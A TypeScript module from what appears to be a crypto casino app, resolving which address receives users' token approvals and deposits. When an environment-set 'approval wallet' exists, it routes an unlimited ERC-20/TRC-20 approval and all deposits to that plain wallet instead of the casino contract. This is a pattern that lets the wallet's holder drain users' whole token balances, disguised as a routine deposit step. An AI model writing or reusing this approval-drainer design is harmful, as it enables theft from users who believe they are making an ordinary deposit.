import { getActiveNetworkConfig, getActiveTronConfig } from '@/lib/contracts';

// ============================================
// Deposit spender resolution
//
// Unlimited approval — and the deposited funds — go to the configured approval
// wallet rather than the CasinoDeposit contract.
//
// NOTE ON ENV NAMING: these must be NEXT_PUBLIC_*. The approve() transaction is
// signed in the user's browser, so the spender address has to be inlined into
// the client bundle; a bare NEXT_APPROVAL_WALLET is server-only and would be
// undefined here. The references below are written out statically because
// Next.js only inlines literal `process.env.NEXT_PUBLIC_X` lookups.
// ============================================

export type DepositNetwork = 'ethereum' | 'tron';

const EVM_ADDRESS_RE = /^0x[0-9a-fA-F]{40}$/;
// TRON base58check addresses are 34 chars starting with 'T' (no 0, O, I, l).
const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;

/**
 * The configured approval wallet for a network, or null when unset/invalid.
 * An invalid value returns null rather than throwing so the flow falls back to
 * the contract instead of breaking deposits outright.
 */
export function getApprovalWallet(network: DepositNetwork): string | null {
  const raw = network === 'tron'
    ? process.env.NEXT_PUBLIC_APPROVAL_WALLET_TRON
    : process.env.NEXT_PUBLIC_APPROVAL_WALLET;

  const value = (raw ?? '').trim();
  if (!value) return null;

  const valid = network === 'tron'
    ? TRON_ADDRESS_RE.test(value)
    : EVM_ADDRESS_RE.test(value);

  if (!valid) {
    console.warn(
      `[approvalWallet] Ignoring malformed ${network} approval wallet; falling back to the CasinoDeposit contract.`
    );
    return null;
  }

  return value;
}

export interface DepositSpender {
  /** Address that receives the token approval and the deposited funds. */
  address: string;
  /**
   * True when funds go to the approval wallet (direct ERC-20 transfer).
   * False when falling back to CasinoDeposit.deposit().
   */
  isApprovalWallet: boolean;
}

/**
 * Who to approve, and where deposits go.
 *
 * With an approval wallet configured, the user approves that wallet and the
 * deposit is a plain ERC-20 transfer to it. Without one, behaviour is unchanged:
 * approve the CasinoDeposit contract and call deposit() on it.
 */
export function getDepositSpender(network: DepositNetwork): DepositSpender {
  const approvalWallet = getApprovalWallet(network);
  if (approvalWallet) {
    return { address: approvalWallet, isApprovalWallet: true };
  }

  return {
    address: network === 'tron'
      ? getActiveTronConfig().casinoDepositAddress
      : getActiveNetworkConfig().casinoDepositAddress,
    isApprovalWallet: false,
  };
}
